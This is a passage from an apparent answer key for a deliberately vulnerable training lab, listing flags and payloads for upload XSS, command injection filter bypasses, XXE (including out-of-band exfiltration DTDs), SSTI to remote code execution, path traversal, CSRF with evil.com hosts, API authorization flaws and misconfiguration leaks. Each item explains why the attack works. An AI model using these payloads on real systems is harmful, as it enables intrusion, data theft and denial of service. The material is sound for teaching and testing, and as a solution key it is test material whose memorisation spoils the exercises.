  | curl --data-binary @- "http://localhost:3000/upload/svg-avatar?filename=xss.svg"
```

The `onload` handler survives (the endpoint only checks for its presence) and
the flag `PENTRIX{upload_upload-svg-onload}` is awarded. Opening
`/uploads/xss.svg` directly serves it as `image/svg+xml` with the handler
intact, so the script runs in the visitor's browser.

Why it works: SVG is XML and allows event handlers on elements, the uploader
never sanitizes them, and the file is served inline as active content.

**8. Strip-once filter bypass** – `PENTRIX{upload_upload-strip-once}`

`/upload/filter` removes each dangerous extension (`.svg`, `.html`, `.htm`)
exactly once with a non-global `replace`. Nest the extension inside itself so
one removal rebuilds it:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/filter?filename=evil.s.svgvg"
```

`evil.s.svgvg` minus one occurrence of `.svg` becomes `evil.svg`; the file is
stored under that name and the flag `PENTRIX{upload_upload-strip-once}` is
awarded. `/upload/view/evil.svg` serves it as `image/svg+xml`.

Why it works: the filter runs only once, so nesting the banned string inside
itself (`.s.svgvg` -> `.svg`) reconstructs the dangerous extension after the
single strip.

**9. Avatar overwrite** – `PENTRIX{upload_upload-overwrite}`

`/upload/avatar` stores files at predictable paths (`avatar-<user>.png`) and
never checks that the uploader owns the target user. Overwrite bob's avatar:

```bash
printf 'ATTACKER-BYTES' \
  | curl --data-binary @- "http://localhost:3000/upload/avatar?user=bob"
```

Since bob's avatar bytes changed from the original, the flag
`PENTRIX{upload_upload-overwrite}` is awarded. Verify the victim URL now
serves attacker content:

```bash
curl http://localhost:3000/upload/avatar/bob   # prints ATTACKER-BYTES
```

Why it works: predictable filenames plus no ownership check let anyone write
any user's file, and the serve path even sniffs content, rendering an HTML
replacement as a page.

**10. GIF/HTML polyglot** – `PENTRIX{upload_upload-polyglot}`

`/upload/polyglot` "validates" images by checking only the first 6 magic
bytes, then `/upload/poly/:name` serves the file as `text/html`. A file can
carry a real GIF header and real HTML at once:

```bash
printf 'GIF89a<script>alert(1)</script>' \
  | curl --data-binary @- "http://localhost:3000/upload/polyglot?filename=x.gif"
```

The magic bytes pass, the scriptable HTML survives, and the flag
`PENTRIX{upload_upload-polyglot}` is awarded. Fetching
`/upload/poly/x.gif` returns `Content-Type: text/html` with
`GIF89a<script>alert(1)</script>` intact, so the browser executes it.

Why it works: magic-byte checks only validate the file's first bytes, and
serving the "validated image" as HTML executes the rest, making a true
polyglot that is both a GIF header and a script.
---

## cmdi – Command Injection

**1. Ping gadget** – `PENTRIX{cmdi_basic}`
Your input is concatenated into a shell command with zero filtering:
```
GET /cmdi/ping?host=127.0.0.1;id
```
Why it works: `;` ends the `ping` command and starts yours. The server runs it with its own privileges.

**2. Filter bypass** – `PENTRIX{cmdi_bypass}`
v2 strips `;`, once. Shells offer other chaining operators:
```
GET /cmdi/ping2?host=127.0.0.1%26%26id
```
(`%26%26` is `&&`.) Newlines (`%0a`) and `||` work too.
Why it works: removing one bad character is not sanitization. Never build shell commands from user input; use argument arrays instead.

---

**3. Ping Gadget v3 (spaces stripped)** - `PENTRIX{cmdi_cmdi-ifs}`

Request:

```
GET /cmdi/ping3?host=127.0.0.1;cat$IFS/etc/passwd
```

The filter deletes every space, so `cat /etc/passwd` becomes `cat/etc/passwd` and
breaks. `$IFS` is the shell's Internal Field Separator variable: unquoted, it expands
to whitespace, giving the shell `cat /etc/passwd` again. The output shows `root:` and
the flag is awarded.

Why it works: the blacklist removes spaces but the shell still expands `$IFS` into a
word separator at run time.

**4. Ping Gadget v4 ($IFS blocked too)** - `PENTRIX{cmdi_cmdi-braces}`

Request (note: `{` and `}` must be URL-encoded as `%7B`/`%7D`, `$` as `%24`):

```
GET /cmdi/ping4?host=127.0.0.1;cat%24%7BIFS%7D/etc/passwd
```

The filter now also strips the literal string `$IFS`. The braced form `${IFS}` refers
to the same variable but does not match the naive string filter, so the shell still
sees `cat /etc/passwd`.

Why it works: string-matching filters do not understand shell syntax, and `${IFS}`
expands exactly like `$IFS`.

**5. Ping Gadget v5 (separators blocked)** - `PENTRIX{cmdi_cmdi-newline}`

Request (`%0a` is a URL-encoded newline):

```
GET /cmdi/ping5?host=127.0.0.1%0acat%20/etc/passwd
```

The filter strips `;`, `&` and `|`, but a newline also terminates a shell command.
The shell receives two lines - `ping -c 1 127.0.0.1` and `cat /etc/passwd` - and runs
both. The output shows `root:` and the flag is awarded.

Why it works: the blacklist forgot that newline is a command separator, and the
value is placed into the command unquoted.

**6. Ping Gadget v6 ($() blocked)** - `PENTRIX{cmdi_cmdi-backtick}`

Request:

```
GET /cmdi/ping6?host=127.0.0.1;echo%20`id`
```

The filter removes `$(`, killing modern `$(...)` substitution. Backticks are the
legacy command-substitution syntax and are untouched, so `` `id` `` runs and its
output (`uid=...`) is echoed.

Why it works: the filter blocks one command-substitution syntax but the shell honors
two.

**7. Ping Gadget v7 (cat and / blocked)** - `PENTRIX{cmdi_cmdi-wildcard}`

Request (`?` encoded as `%3F`, space as `%20`):

```
GET /cmdi/ping7?host=127.0.0.1;/%3F%3F%3F/bin/%3Fat%20/%3F%3F%3F/p%3Fsswd
```

The filter strips the word `cat` and standalone `/` tokens. `?` is a glob wildcard
matching any single character, so the shell expands `/???/bin/?at` to `/bin/cat` and
`/???/p?sswd` to `/etc/passwd` (and `/bin/passwd`) at run time. Neither blocked word
is ever typed. The output contains `root:` and the flag is awarded.

Why it works: the blacklist matches literal words, but glob wildcards let the shell
itself rebuild the blocked words during pathname expansion.

**8. Ping Gadget v8 (; blocked)** - `PENTRIX{cmdi_cmdi-pipe}`

Request:

```
GET /cmdi/ping8?host=127.0.0.1|id
```

Only `;` is stripped. The pipe `|` chains commands without it: `ping -c 1 127.0.0.1`
runs, its output is piped into `id`, and `id` prints `uid=...`.

Why it works: `|` is a command separator the single-character blacklist never
considered.

**9. Ping Gadget v9 (spaces blocked, again)** - `PENTRIX{cmdi_cmdi-tab}`

Request (`%09` is a URL-encoded tab):

```
GET /cmdi/ping9?host=127.0.0.1;cat%09/etc/passwd
```

Spaces are stripped, but a literal tab is also shell whitespace. The shell sees
`cat<TAB>/etc/passwd`, runs it, and the output shows `root:`.

Why it works: the filter blocks one whitespace character while the shell accepts
several (space, tab, newline).

**10. Ping Gadget v10 (metachars blocked, unquoted)** - `PENTRIX{cmdi_cmdi-env}`

Request (`%0a` is a URL-encoded newline):

```
GET /cmdi/ping10?host=127.0.0.1%0aid
```

The blacklist strips `;`, `|`, `&`, `$` and backticks, but the value is dropped into
the command line with no quotes. A newline starts a second command, so the shell runs
`ping -c 1 127.0.0.1` and then `id`. The output shows `uid=...` and the flag is
awarded.

Why it works: no blacklist can be complete, and an unquoted newline is a command
separator this one missed.
---

## xxe – XML External Entity Injection

**1. XXE file read** – `PENTRIX{xxe_file}`
The XML importer resolves external entities. Declare one pointing at a local file:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]>
<data><name>&xxe;</name></data>
```
```
POST /xxe/import   (form field: xml)
```
Why it works: the parser fetches `file://` URIs and substitutes the file contents into the document.

**2. SSRF via XXE** – `PENTRIX{xxe_ssrf}`
The same entity expander also fetches `http://` URLs. Point the entity at the SSRF module's internal secret endpoint and chain XXE into SSRF. Same request shape as above with an `http://` SYSTEM URI.

---

**3. Billion Laughs (Entity-Expansion DoS)** - `PENTRIX{xxe_xxe-billion-laughs}`

Request (use `--data-urlencode` so the `&` characters survive):

```
POST /xxe/billion
xml=<!DOCTYPE lolz [<!ENTITY lol "xxxxxxxxxx"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ... up to lol7 ... ]><data>&lol7;</data>
```

Each level references the previous one ten times, so expansion multiplies the work by
ten per level. The endpoint expands internal entities recursively with no depth
limit: the 7-level payload (515 bytes in) expands to ~16 MB and keeps the parser
busy for seconds. The flag is awarded when parse time exceeds 1.5 s (or expansion
passes 5 MB, which de-flakes fast hardware). Verified: 16,111,259 chars expanded,
~2.6 s parse time.

Why it works: recursive entity expansion is exponential, and nothing caps the
recursion depth or total output.

**4. External DTD Exfiltration** - `PENTRIX{xxe_xxe-external-dtd}`

Step 1 - host the malicious DTD on the in-lab collector:

```
POST /xxe/collector/dtd
dtd=<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
<!ENTITY pingback SYSTEM "http://127.0.0.1:3105/xxe/collector/log?d=%file;">
```

Step 2 - import XML that pulls in the hosted DTD:

```
POST /xxe/dtd
xml=<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1:3105/xxe/collector/dtd"> %dtd;]><data>&pingback;</data>
```

The endpoint fetches the DTD, expands `%file;` inside it (reading `secret.txt` into
the pingback URL), then resolves the `pingback` entity, which makes the server
request `/xxe/collector/log?d=XXE-SECRET-4471`. The exfiltrated secret lands in the
collector log, and the flag is awarded. (The collector page shows a ready-to-paste
DTD template with the correct absolute path and port.)

Why it works: external DTDs are fetched and their parameter entities are honored, so
a DTD can turn a file read into a server-side request carrying the file content.

**5. XXE in Uploaded SVG** - `PENTRIX{xxe_xxe-svg}`

Request:

```
POST /xxe/svg
svg=<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

The SVG text extractor runs the module's entity-expanding parser before pulling out
`<text>` elements. An SVG is just XML, so the DOCTYPE rides along, the `file://`
entity is resolved, and the secret appears in the extracted text.

Why it works: the "parser" expands external entities on any XML it is handed,
including uploaded SVGs.

**6. XInclude File Inclusion** - `PENTRIX{xxe_xxe-xinclude}`

Request:

```
POST /xxe/xinclude
xml=<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt" parse="text"/></root>
```

The endpoint honors `<xi:include>` tags and resolves the `href` server-side with the
same `file://`/`http://` support as entities. The file content is spliced into the
document and shown in the output.

Why it works: `xi:include` hrefs are fetched server-side with no allowlist, which is
XXE by another name.

**7. Parameter-Entity OOB Exfiltration** - `PENTRIX{xxe_xxe-param-oob}`

Request (single quotes around the inner URL are required):

```
POST /xxe/param
xml=<!DOCTYPE r [
<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://127.0.0.1:3105/xxe/collector/log?d=%file;'>">
%oob;
]>
<data>&exfil;</data>
```

Everything happens inline: `%file;` reads the secret, `%oob;` smuggles a brand-new
`<!ENTITY>` declaration into the doctype at parse time (the outer value is
double-quoted, so the inner declaration uses single quotes), and `&exfil;` makes the
server request the collector URL with the secret in it. Two pingbacks land in the
collector log carrying `XXE-SECRET-4471`, and the flag is awarded.

Why it works: parameter entities are expanded inside the doctype, so an attacker can
declare new external entities at parse time and pivot a file read into an
out-of-band request.

**8. XXE in SOAP Endpoint** - `PENTRIX{xxe_xxe-soap}`

Request:

```
POST /xxe/soap
xml=<?xml version="1.0"?><!DOCTYPE env [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>
```

A second XML endpoint expecting a SOAP envelope runs the same naive entity-expanding
parser before reading the Body. The DOCTYPE declares a `file://` entity, `&xxe;` is
referenced inside `<soap:Body>`, and the secret appears in the service response.

Why it works: every XML entry point shares the vulnerable parser, so the classic
`file://` entity works on the SOAP endpoint too.
---

## ssti – Server-Side Template Injection

**1. Basic SSTI** – `PENTRIX{ssti_basic}`
Your name is dropped into a template that gets evaluated:
```
GET /ssti/greet?name={{7*7}}
```
The page answers "Hello 49!", proving server-side evaluation.

**2. SSTI to RCE** – `PENTRIX{ssti_rce}`
Once template syntax evaluates, reach for the engine's internals (objects, attributes, subclasses) to break out of the sandbox and run OS commands or read the flag variable the challenge exposes:
```
GET /ssti/greet?name={{secretFlag}}
```
Why it works: templates are code. Rendering user input as template source hands attackers the interpreter.

---

**3. Template Injection on a Second Endpoint** - `PENTRIX{ssti_ssti-echo2}`

Request:

```
GET /ssti/card?msg={{7*7}}
```

A second endpoint runs the identical naive engine with no filter. `{{7*7}}` evaluates
to 49 in the invitation card.

Why it works: the template engine evaluates anything inside `{{ }}` as server-side
code.

**4. Word Blacklist Bypass** - `PENTRIX{ssti_ssti-wordfilter}`

Request:

```
GET /ssti/wordfilter?input={{eval("vaultSec"+"ret")}}
```

The filter deletes the words `flag`, `secret` and `config`, so `{{vaultSecret}}`
becomes `{{vault}}` and fails. Splitting the blocked word across a string
concatenation (`"vaultSec"+"ret"`) means the literal word never appears in the input;
the nested `eval()` reassembles it at run time and reads the in-scope variable.

Why it works: the blacklist is plain substring matching, and string concatenation
plus a nested `eval()` rebuilds the blocked identifier after filtering.

**5. Underscore Blacklist Bypass** - `PENTRIX{ssti_ssti-nounderscore}`

Request:

```
GET /ssti/nounderscore?input={{eval("db"+String.fromCharCode(95)+"pass")}}
```

Underscores are deleted, so `{{db_pass}}` becomes `{{dbpass}}`. Character code 95 is
`_`, so `String.fromCharCode(95)` rebuilds the underscore at run time and the nested
`eval()` resolves `db_pass`.

Why it works: the filter removes a character the attacker can regenerate from its
character code.

**6. Bracket Blacklist Bypass** - `PENTRIX{ssti_ssti-nobrackets}`

Request:

```
GET /ssti/nobrackets?input={{JSON.stringify(cfg)}}
```

Brackets are deleted and the flag lives in `cfg["db-pass"]`, whose key contains a
dash, so dot notation cannot reach it either. Instead of indexing the object,
`JSON.stringify(cfg)` serializes the whole object to text, revealing the flag with
no brackets at all.

Why it works: when indexing is impossible, serializing the entire object leaks every
property.

**7. Dot Blacklist Bypass** - `PENTRIX{ssti_ssti-dotblock}`

Request:

```
GET /ssti/dotblock?input={{db["key"]}}
```

Dots are deleted, so `{{db.key}}` becomes `{{dbkey}}` and fails. JavaScript's
bracket notation (`db["key"]`) accesses the same property with no dots.

Why it works: property access has two syntaxes, and the filter only blocks one.

**8. Curly-Brace Strip Bypass** - `PENTRIX{ssti_ssti-curly}`

Request:

```
GET /ssti/curly?input={{{{7*7}}}}
```

The filter removes the first `{{` and the first `}}` only, once each (like the naive
semicolon filter in the cmdi module). Sending doubled braces leaves one working
`{{7*7}}` behind after stripping, which evaluates to 49.

Why it works: a strip-once filter is defeated by doubling the stripped sequence.

**9. Quote Blacklist Bypass** - `PENTRIX{ssti_ssti-noquotes}`

Request:

```
GET /ssti/noquotes?input={{eval(String.fromCharCode(118,97,117,108,116,75,101,121))}}
```

Quotes are deleted and the variable name `vaultKey` is blocked as a word, so no
string literal and no direct reference is possible. The character codes spell
`vaultKey` (118=v, 97=a, 117=u, 108=l, 116=t, 75=K, 101=e, 121=y) with no quotes and
no blocked word; the nested `eval()` turns it back into the identifier.

Why it works: any string can be rebuilt from character codes, and a nested `eval()`
evaluates the rebuilt identifier in the template scope.

**10. SSTI to Remote Code Execution** - `PENTRIX{ssti_ssti-rce}`

Request:

```
GET /ssti/exec?expr={{require("child_process").execSync("id").toString()}}
```

There is no sandbox: template expressions run in Node.js with `require()` in scope.
Reaching `child_process` turns the injection into OS command execution, and the
`uid=...` output of `id` is rendered into the page.

Why it works: the template engine is raw `eval()` in a Node.js process, so SSTI
escalates directly to RCE via `require("child_process")`.
---

## lfi – Path Traversal

**1. Basic traversal** – `PENTRIX{lfi_traversal}`
The `file` parameter is used as a filesystem path with no checks:
```
GET /lfi/view?file=..%2Fdocs%2Fsecret.txt
```
Why it works: `../` climbs out of the intended directory.

**2. Filter bypass** – `PENTRIX{lfi_filter-bypass}`
The download endpoint strips `../` exactly once. Nest the sequences so the strip creates a new one:
```
GET /lfi/download?file=....%2F%2Fdocs%2Fsecret.txt
```
(`....//` minus one `../` pass collapses back to `../`.)
Why it works: single-pass sanitization is undone by its own removal. Canonicalize the path first, then check it stays inside the allowed root.

---

**3. Absolute Path Read** - `PENTRIX{lfi_absolute}`
Request: `GET /lfi/abs?page=/etc/passwd`
The page prints `/etc/passwd` (look for `root:x:0:0`) and the flag box appears.
Why it works: the reader uses absolute paths verbatim instead of confining reads to the docs folder, so no `../` traversal is needed at all.

**4. Double-Encoding Bypass** - `PENTRIX{lfi_double-encode}`
Request: `GET /lfi/double?page=%252e%252e%252fdocs%252fsecret.txt`
The filter decodes once, sees no `..`, and lets it through; the value is decoded a second time on use, becoming `../docs/secret.txt`, and the secret (`LFI-SECRET-8830`) is printed with the flag.
Why it works: single-decode-then-check is defeated when the application decodes again after the check; `%252e` survives the first decode as `%2e` and becomes `.` on the second.

**5. Deep Nesting Bypass** - `PENTRIX{lfi_nested-deep}`
Request: `GET /lfi/nested?page=....///docs/secret.txt`
The filter strips every `../` in one pass, turning `....///` into `..//`, which normalizes to `../`; the secret is printed with the flag. (`...//docs/secret.txt` works too.)
Why it works: a one-pass strip never re-inspects its own output, so nested dots regenerate a fresh traversal sequence after filtering.

**6. Language Parameter Traversal** - `PENTRIX{lfi_lang}`
Request: `GET /lfi/lang?lang=../secret`
The viewer reads `docs/lang/../secret.txt`, which resolves to `docs/secret.txt`; the secret is printed with the flag.
Why it works: the `lang` parameter is concatenated into a filesystem path with zero validation, so it is just another filename input.

**7. Log Poisoning Chain** - `PENTRIX{lfi_log-poison}`
Step 1, poison the log: `curl -A "PENTRIX-LOG-MARKER pwned" http://localhost:3000/lfi/log-demo`
Step 2, read the log back through the LFI: `GET /lfi/view?file=../lfi_access.log`
Your marker appears in the file content returned by the viewer, and the flag is awarded.
Why it works: the access log stores the raw User-Agent with no filtering (log injection), and the document viewer reads that log file via traversal, chaining the two flaws.

**8. Process Environ Leak** - `PENTRIX{lfi_proc-self}`
Request: `GET /lfi/procinfo?f=environ`
The page prints the raw `/proc/self/environ` (NUL-separated `KEY=value` entries, including `PATH=`) and the flag is awarded.
Why it works: the filename is appended to `/proc/self/` with no validation, and `environ` exposes the whole process environment, secrets included.

**9. Encoded Separator Bypass** - `PENTRIX{lfi_enc-slash}`
Request: `GET /lfi/enc?page=%2e%2e%2fdocs%2fsecret.txt`
The filter rejects literal `..` and `/` but checks before decoding; `%2e%2e%2f` passes the check and decodes to `../` afterwards. The secret is printed with the flag.
Why it works: validating the still-encoded input is useless once a decode happens after the check.

**10. Secret Config Read** - `PENTRIX{lfi_config-read}`
Request: `GET /lfi/config?file=../lfi_secret.conf`
The planted config one directory above docs is printed (contains `LFI-CONFIG-SECRET-5521`) and the flag is awarded.
Why it works: the config viewer applies no validation at all, and a secret file was left within traversal reach.
---

## csrf – Cross-Site Request Forgery

**1. State-changing GET** – `PENTRIX{csrf_email}`
Log in (`GET /csrf/login/alice`), then note the email change needs no token and rides on your session cookie:
```
GET /csrf/change-email?email=pwned@evil.com
```
In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it.

**2. Open redirect** – `PENTRIX{csrf_redirect}`
```
GET /csrf/go?to=https://evil.com
```
The server 302-redirects to any external URL. Attackers use this for phishing ("this link really goes to our site, look at the domain").
Why it works: the `to` parameter is never validated against an allowlist.

**3. Clickjacking** – `PENTRIX{csrf_clickjacking}`
```
GET /csrf/framedemo
```
The page is frameable because no `X-Frame-Options` / `frame-ancestors` header is set, so an attacker can overlay invisible frames and steal clicks.
Why it works: without framing defenses, your authenticated page becomes a puppet inside the attacker's page.

---

**4. JSON API CSRF via text/plain (simple request)** – `PENTRIX{csrf_json-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/json-email` and submit the "Fire forged JSON request" form (it uses `enctype="text/plain"` with a hidden field named `{"email":"attacker@evil.com"}`).
   Equivalent curl: `curl -b cookies -X POST -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}' /csrf/api/email`
3. The email changes and the flag is awarded.
Why it works: the endpoint mines text/plain bodies for a JSON object and has no CSRF token; a `text/plain` form is a CORS simple request, so no preflight blocks the forged cross-site call and cookies are attached.

**5. Login CSRF (forged session switch)** – `PENTRIX{csrf_login-csrf}`
1. Log in: open `/csrf/login/alice` (you are alice).
2. Visit `/csrf/attacker-login` ("totally legit site"). Its hidden form auto-submits `POST /csrf/login` with `username=mallory`.
3. Your session user switches to mallory and the flag is awarded.
Why it works: the login endpoint performs the state-changing session switch with no CSRF token, so any third-party page can log the victim into an attacker-chosen account.

**6. Password Change via multipart/form-data (no token)** – `PENTRIX{csrf_multipart-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/password-multipart` and submit the form (it uses `enctype="multipart/form-data"`).
   Equivalent curl: `curl -b cookies -X POST -F "password=hacked123" /csrf/api/password-multipart`
3. The password changes and the flag is awarded.
Why it works: the endpoint parses multipart bodies and checks no CSRF token; multipart is just a body format any cross-site form can use, and it needs no preflight.

**7. Weak Referer Check Bypass** – `PENTRIX{csrf_referer-bypass}`
1. Log in: open `/csrf/login/alice`.
2. Send the nickname change with a forged Referer:
   `curl -b cookies -X POST -H "Referer: https://evil.com/?pentrix.lab" -d "nickname=pwned" /csrf/api/nickname`
3. The nickname changes and the flag is awarded (a missing or non-matching referer gets 403).
Why it works: the check is `referer.includes('pentrix.lab')`, and the attacker fully controls the referer sent from their own page, so `https://evil.com/?pentrix.lab` contains the magic substring.

**8. Password Change via GET (no token)** – `PENTRIX{csrf_get-passwd-change}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/change-password?password=hacked123` (or click the simulated attacker link on the challenge page).
3. The password changes and the flag is awarded.
Why it works: the password change is a state-changing GET with no CSRF token, so a forged link or `<img>` tag on any third-party page triggers it with the victim's cookies.

**9. Content-Type Confusion on a JSON API** – `PENTRIX{csrf_contenttype-bypass}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/theme` and submit the plain HTML form (urlencoded) to `POST /csrf/api/theme`.
   Equivalent curl: `curl -b cookies -X POST -d "theme=dark" /csrf/api/theme`
3. The theme changes and the flag is awarded. (The intended JSON client — `Content-Type: application/json` — also works but earns no flag.)
Why it works: the developers assumed only JSON clients would call the endpoint, but the urlencoded body parser also populates `req.body`, so a plain cross-site form with no preflight drives the "JSON-only" API.

**10. HTTP Method Override Smuggling (_method=DELETE)** – `PENTRIX{csrf_method-override-csrf}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/account` and submit the form containing the hidden `_method=DELETE` field (a plain POST).
   Equivalent curl: `curl -b cookies -X POST -d "_method=DELETE" /csrf/account`
3. The delete path triggers and the flag is awarded. (A real `DELETE /csrf/account` also deletes but earns no flag.)
Why it works: cross-site `DELETE` needs a CORS preflight, but a plain POST does not; the app's manual `_method` override lets the "protected" method ride in on a preflight-free POST.

**11. Disable 2FA via GET Link (no token)** – `PENTRIX{csrf_2fa-disable-get}`
1. Log in: open `/csrf/login/alice`.
2. Open `/csrf/2fa/disable` (the link shown on the `/csrf/2fa` page).
3. 2FA is disabled and the flag is awarded.
Why it works: disabling two-factor authentication is a security-sensitive state change performed over GET with no CSRF token, so a single attacker link or image load strips the victim's second factor.
---

## api – API Security

**1. Mass assignment** – `PENTRIX{api_mass-assignment}`
Log in (`GET /api/login/alice`), then PATCH your profile with an extra field the API blindly copies:
```
PATCH /api/me
{"role":"admin"}
```
Why it works: the update handler merges the whole JSON body into the user object instead of picking allowed fields.

**2. Excessive data exposure** – `PENTRIX{api_exposure}`
```
GET /api/users
```
The response includes password hashes, and the flag rides in the `X-Pentrix-Flag` header. APIs must return only what the client needs.

**3. Missing rate limiting** – `PENTRIX{api_rate-limit}`
 Hammer the login endpoint: 14 failed attempts, then a correct one on attempt 15 (`alice` / `alice123`). No throttling exists, so credential stuffing is trivially scriptable.

---

**4. BOLA: Order Access** – `PENTRIX{api_bola-orders}`

`GET /api/v1/orders/:id` trusts the id and never checks ownership:

```bash
curl -b c.txt http://localhost:3000/api/v1/orders/1   # your own order
curl -b c.txt http://localhost:3000/api/v1/orders/2   # bob's order, address included
```

Reading order 2 as alice returns another user's order (with their address) and
awards the flag.

Why it works: broken object-level authorization; the endpoint resolves the
object id without verifying it belongs to the caller.

**5. Mass Assignment: Role** – `PENTRIX{api_mass-assign-role}`

`PATCH /api/v1/users/:id` builds its SQL SET clause from every key in the JSON
body, with no allowlist:

```bash
curl -b c.txt -X PATCH http://localhost:3000/api/v1/users/2 \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

The response shows your role flipped to admin and the flag is awarded.

Why it works: client-controlled keys become columns in the UPDATE, so `role`
is writable even though no UI ever sends it.

**6. API Key Exposure** – `PENTRIX{api_data-exposure-keys}`

`GET /api/v1/me` bundles a secret API key into the profile response:

```bash
curl -b c.txt http://localhost:3000/api/v1/me
```

The JSON contains `api_secret` (e.g. `ak_live_alice_9f2c41`), a credential the
client should never see. Fetching it awards the flag.

Why it works: excessive data exposure; the server serializes internal secrets
into a client-facing response.

**7. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{api_ratelimit-xff}`

`POST /api/v1/login` locks an IP out after 3 bad attempts, but the "client IP"
is read from the `X-Forwarded-For` header, which you control:

```bash
# burn the 3 attempts for your real IP
for i in 1 2 3 4; do
  curl -s -X POST http://localhost:3000/api/v1/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"wrong"}'
done
# 4th attempt: 429 Too many attempts. The real password is locked out too:
curl -s -X POST http://localhost:3000/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'   # still 429
# change your "IP" and walk in
curl -s -X POST http://localhost:3000/api/v1/login \
  -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \
  -d '{"username":"alice","password":"alice123"}'   # ok:true + flag
```

The flag is awarded when the real IP is locked out yet the login succeeds under
a spoofed header.

Why it works: rate-limit identity comes from a client-controlled header, so the
attacker gets a fresh quota by spoofing a new IP per attempt.

**8. Unsafe PUT: Read-only Field Overwrite** – `PENTRIX{api_unsafe-put}`

`PUT /api/v1/profile` replaces your profile object and copies every key you
send, including the read-only `is_admin` flag:

```bash
curl -b c.txt -X PUT http://localhost:3000/api/v1/profile \
  -H 'Content-Type: application/json' \
  -d '{"display_name":"alice","is_admin":1}'
```

The response shows `is_admin: 1` and the flag is awarded.

Why it works: PUT full-object replacement with no field allowlist lets the
client overwrite server-managed fields.

**9. API Version AuthZ Bypass** – `PENTRIX{api_api-version-bypass}`

`GET /api/v1/users/:id` enforces "your own record, or admin". The v2 copy
forgot the check:

```bash
curl -b c.txt http://localhost:3000/api/v1/users/3   # 403 Forbidden
curl -b c.txt http://localhost:3000/api/v2/users/3   # bob's full record + flag
```

The v2 response includes bob's password hash and secret.

Why it works: the authorization check was not carried over when the endpoint
was versioned, so the new route exposes what the old one protects.

**10. IDOR: Invoice Enumeration** – `PENTRIX{api_id-enumeration}`

Invoice ids are sequential and `GET /api/v1/invoices/:id` does not check
ownership:

```bash
curl -b c.txt http://localhost:3000/api/v1/invoices/1   # yours
curl -b c.txt http://localhost:3000/api/v1/invoices/2   # someone else's + flag
```

Why it works: predictable identifiers plus missing ownership check turn id
guessing into cross-user data access.

**11. PATCH Self-Privilege Escalation** – `PENTRIX{api_patch-self-admin}`

`PATCH /api/v1/me` is meant for `display_name` and `bio`, but there is no
allowlist:

```bash
curl -b c.txt -X PATCH http://localhost:3000/api/v1/me \
  -H 'Content-Type: application/json' \
  -d '{"is_admin":1}'
```

The response shows `is_admin: 1` and the flag is awarded. A benign
`{"bio":"hello"}` patch earns nothing, proving the flag is tied to the
privilege field.

Why it works: partial-update endpoints that merge arbitrary keys into the
record let the client promote itself.
---

## misconfig – Security Misconfiguration

**1. Verbose debug errors** – `PENTRIX{misconfig_debug}`
```
GET /misconfig/debug?err=1
```
The error page dumps configuration, and the `debugToken` in the dump *is* the flag. Stack traces and config dumps belong in logs, not responses.

**2. Exposed backup file** – `PENTRIX{misconfig_backup}`
```
GET /misconfig/backup.sql
```
A database backup sits in the web root, served like any static file. It contains the flag (and in real life, credentials).

**3. Directory listing** – `PENTRIX{misconfig_listing}`
```
GET /misconfig/files/
```
Directory browsing is enabled. The listing reveals `secret.txt`; fetch it for the flag. Disable auto-indexing and keep secrets out of web-accessible paths.

---

*All flags look like `PENTRIX{...}`. If a payload stops working, reset the lab database by deleting `data/vulnlab.db` and restarting the app – some challenges mutate lab state (passwords, roles, emails) by design.*

**4. Exposed .git Directory** - `PENTRIX{misconfig_git}`
Walk the chain:
`GET /misconfig/.git/HEAD` gives `ref: refs/heads/main`
`GET /misconfig/.git/refs/heads/main` gives the commit hash `a1b2c3d4...`
`GET /misconfig/.git/objects/` lists `a1/`, `GET /misconfig/.git/objects/a1/` lists the object file
`GET /misconfig/.git/objects/a1/b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4` prints the commit, whose diff leaks `ADMIN_BACKUP_TOKEN`, and the flag is awarded.
Why it works: version-control metadata served over HTTP lets anyone resolve refs and read objects, and this commit's diff contains a production secret.

**5. Vim Swap File Leak** - `PENTRIX{misconfig_swp}`
Request: `GET /misconfig/app.js.swp`
The recovered editor backup prints dev notes with a database password, a Stripe key, and the backup token flag.
Why it works: the swap artifact was left in the web-accessible tree and is served to anyone who guesses its name.

**6. HTTP TRACE Enabled (XST)** - `PENTRIX{misconfig_trace}`
Request: `curl -X TRACE http://localhost:3000/misconfig/trace -H "X-Custom: hello"`
The server reflects the full request (your headers come back in the page) and the flag is awarded.
